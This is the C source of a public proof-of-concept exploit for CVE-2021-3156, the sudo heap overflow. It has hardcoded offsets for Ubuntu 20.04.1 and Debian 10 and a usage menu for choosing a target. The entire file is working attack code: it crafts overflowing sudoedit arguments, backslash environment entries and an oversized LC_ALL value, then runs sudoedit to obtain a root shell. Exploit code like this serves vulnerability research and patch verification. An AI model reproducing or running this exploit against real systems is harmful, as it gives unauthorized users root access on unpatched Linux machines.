/**
 ** CVE-2021-3156 PoC by blasty <peter@haxx.in>
 ** ===========================================
 **
 ** Exploit for that sudo heap overflow thing everyone is talking about.
 ** This one aims for singleshot. Does not fuck with your system files.
 ** No warranties.
 **
 ** Shout outs to:
 **   Qualys      - for pumping out the awesome bugs
 **   lockedbyte  - for coop hax. (shared tmux gdb sessions ftw)
 **   dsc         - for letting me rack up his electricity bill
 **   my wife     - for all the quality time we had to skip
 **
 **  Enjoy!
 **
 **   -- blasty // 20210130
 **/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <ctype.h>

// 512 environment variables should be enough for everyone
#define MAX_ENVP 512

typedef struct {
	char *target_name;
	char *sudoedit_path;
	uint32_t smash_len_a;
	uint32_t smash_len_b;
	uint32_t null_stomp_len;
	uint32_t lc_all_len; 
} target_t;

target_t targets[] = {
    {
        .target_name    = "Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 56,
        .smash_len_b    = 54,
        .null_stomp_len = 63, 
        .lc_all_len     = 212
    },
    {
        .target_name    = "Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28",
        .sudoedit_path  = "/usr/bin/sudoedit",
        .smash_len_a    = 64,
        .smash_len_b    = 49,
        .null_stomp_len = 60, 
        .lc_all_len     = 214
    }
};

void usage(char *prog) {
    printf("  usage: %s <target>\n\n", prog);
    printf("  available targets:\n");
    printf("  ------------------------------------------------------------\n");
    for(int i = 0; i < sizeof(targets) / sizeof(target_t); i++) {
        printf("    %d) %s\n", i, targets[i].target_name);
    }
    printf("  ------------------------------------------------------------\n");
    printf("\n");
}

int main(int argc, char *argv[]) {
    printf("\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n");

    if (argc != 2) {
        usage(argv[0]);
        return -1;
    }

    target_t *target = &targets[ atoi(argv[1]) ];

    printf("using target: '%s'\n", target->target_name);

    char *smash_a = calloc(target->smash_len_a + 2, 1);
    char *smash_b = calloc(target->smash_len_b + 2, 1);

    memset(smash_a, 'A', target->smash_len_a);
    memset(smash_b, 'B', target->smash_len_b);

    smash_a[target->smash_len_a] = '\\';
    smash_b[target->smash_len_b] = '\\';

    char *s_argv[]={
        "sudoedit", "-s", smash_a, "\\", smash_b, NULL
    };

    char *s_envp[MAX_ENVP];
    int envp_pos = 0;

    for(int i = 0; i < target->null_stomp_len; i++) {
        s_envp[envp_pos++] = "\\";
    }
    s_envp[envp_pos++] = "X/P0P_SH3LLZ_";

    char *lc_all = calloc(target->lc_all_len + 16, 1);
    strcpy(lc_all, "LC_ALL=C.UTF-8@");
    memset(lc_all+15, 'C', target->lc_all_len);

    s_envp[envp_pos++] = lc_all;
    s_envp[envp_pos++] = NULL;

    printf("** pray for your rootshell.. **\n");

    execve(target->sudoedit_path, s_argv, s_envp);
    return 0;
}
